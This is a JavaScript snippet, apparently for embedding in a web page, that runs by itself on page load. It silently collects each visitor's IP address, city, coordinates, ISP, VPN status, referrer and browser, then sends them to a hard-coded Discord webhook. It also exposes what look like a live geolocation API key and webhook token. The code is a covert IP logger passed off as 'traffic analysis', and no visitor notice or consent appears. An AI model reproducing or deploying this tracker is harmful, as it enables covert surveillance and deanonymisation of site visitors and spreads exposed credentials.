
    function httpGetAsync(url, callback) {
        const xmlHttp = new XMLHttpRequest();
        xmlHttp.onreadystatechange = function() {
            if (xmlHttp.readyState === 4 && xmlHttp.status === 200)
                callback(xmlHttp.responseText);
        }
        xmlHttp.open("GET", url, true); // true for asynchronous
        xmlHttp.send(null);
    }

    function analyzeTraffic() {
        const ipUrl = "https://api64.ipify.org?format=json";
        const geoUrl = "https://ipgeolocation.abstractapi.com/v1/?api_key=577cf8161d6e494bb7fb0df8e0b9102e"; // Replace with your Abstract API key
        const discordWebhook = 'https://discord.com/api/webhooks/1177615963181555873/papaMgplo57758omJyzaywBltB7CZdtVTYFblcGYWHeCyfPMz_48Lcyb2-T3rqHrsmSz'; // Replace with your Discord webhook URL

        httpGetAsync(ipUrl, function(ipData) {
            const ipInfo = JSON.parse(ipData);
            const userInformation = {
                ip_address: ipInfo.ip,
                current_url: window.location.href
            };

            httpGetAsync(geoUrl, function(geoData) {
                const geoInfo = JSON.parse(geoData);
                userInformation.city = geoInfo.city;
                userInformation.city_geoname_id = geoInfo.city_geoname_id;
                userInformation.region = geoInfo.region;
                userInformation.country = geoInfo.country;
                userInformation.country_code = geoInfo.country_code;
                userInformation.continent = geoInfo.continent;
                userInformation.continent_code = geoInfo.continent_code;
                userInformation.longitude = geoInfo.longitude;
                userInformation.latitude = geoInfo.latitude;
                userInformation.security_vpn = geoInfo.security.is_vpn;
                userInformation.flag = geoInfo.flag;
                userInformation.isp_name = geoInfo.isp_name;
                userInformation.timezone_name = geoInfo.timezone.name;
                userInformation.timezone_abbreviation = geoInfo.timezone.abbreviation;
                userInformation.timezone_gmt_offset = geoInfo.timezone.gmt_offset;
                userInformation.current_time = geoInfo.timezone.current_time;

                // Additional user information
                userInformation.date = new Date().toLocaleDateString();
                userInformation.day = new Date().toLocaleDateString('en-US', { weekday: 'long' });
                userInformation.time = new Date().toLocaleTimeString();
                userInformation.referringURL = document.referrer;
                userInformation.browser = navigator.userAgent;
                userInformation.device = geoInfo.device_type;

                sendToDiscord(userInformation, discordWebhook);
            });
        });
    }

    function sendToDiscord(data, webhookURL) {
        const request = new XMLHttpRequest();
        request.open("POST", webhookURL);

        const emojis = {
            location: '🌍',
            vpn: '🛡️',
            calendar: '📅',
            clock: '🕒',
            link: '🔗',
            computer: '💻',
        };

        const messageContent = `**🚩  IP Address:** ${data.ip_address}\n` +
            `**🔗 Current URL:** ${data.current_url}\n` +
            `**🏘️ City:** ${data.city}\n` +
            `**🏞️Region:** ${data.region}\n` +
            `**🌐 Country:** ${data.country} (${data.country_code})\n` +
            `**🌍Continent:** ${data.continent} (${data.continent_code})\n` +
            `**🗺️ Longitude/Latitude:** ${data.longitude}, ${data.latitude}\n` +
            `**🛡️ VPN Status:** ${data.security_vpn ? 'Using VPN' : 'Not Using VPN'}\n` +
            `**🎌 Flag:** ${data.flag}\n` +
            `**🏢 ISP:** ${data.isp_name}\n` +
            `**📅 Date:** ${data.date}\n` +
            `**📆 Day:** ${data.day}\n` +
            `**⌚ Time:** ${data.time}\n` +
            `**🔗 Referring URL:** ${data.referringURL}\n` +
            `**🌐 Browser:** ${data.browser}\n` +
            `**💻  Device:** ${data.device}`;

        const message = JSON.stringify({ content: messageContent });

        request.setRequestHeader('Content-type', 'application/json');
        request.send(message);
    }

    window.onload = function() {
        analyzeTraffic(); // Automatically run the analysis when the page loads
    };
